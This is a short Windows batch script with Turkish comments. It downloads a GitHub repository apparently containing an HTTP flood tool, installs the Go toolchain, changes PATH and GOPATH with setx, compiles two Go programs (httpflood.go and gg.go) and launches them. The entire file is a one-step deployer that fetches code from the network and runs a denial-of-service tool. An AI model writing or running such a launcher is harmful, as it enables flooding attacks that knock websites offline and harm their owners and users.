@echo off
echo == GitHub reposunu indiriliyor... ==
REM PowerShell kullanarak WebClient sınıfı ile repo indiriliyor
powershell -Command "[System.Net.WebClient]::new().DownloadFile('https://github.com/murmurlab/golang-httpflood/archive/refs/heads/master.zip', '$env:USERPROFILE\flo.zip')"

echo == İndirilen repo çıkarılıyor... ==
REM Dosyayı hedef dizine çıkar
powershell -Command "Expand-Archive -Path $env:USERPROFILE\flo.zip -DestinationPath $env:USERPROFILE\flo"

echo == Go dilini indiriliyor... ==
REM Go'yu WebClient ile indir
powershell -Command "[System.Net.WebClient]::new().DownloadFile('https://go.dev/dl/go1.19.4.windows-amd64.zip', '$env:USERPROFILE\gol.zip')"

echo == Go dil dosyaları çıkarılıyor... ==
REM Go'yu çıkar
powershell -Command "Expand-Archive -Path $env:USERPROFILE\gol.zip -DestinationPath $env:USERPROFILE"

echo == Go binary yolu ayarlanıyor... ==
REM Go binary yolunu ayarla
setx GOPATH "%USERPROFILE%\go"
setx PATH "%PATH%;%USERPROFILE%\go\bin"

echo == Go dosyaları derleniyor... ==
REM Go dosyalarını derle
powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\httpflood.go"
powershell -Command "$env:USERPROFILE\go\bin\go.exe build $env:USERPROFILE\flo\golang-httpflood-main\gg.go"

echo == Çıktılar çalıştırılıyor... ==
REM Çıktıları çalıştır
powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\httpflood.exe"
powershell -Command "Start-Process -FilePath $env:USERPROFILE\flo\golang-httpflood-main\gg.exe"

echo == İşlem tamamlandı! ==
pause
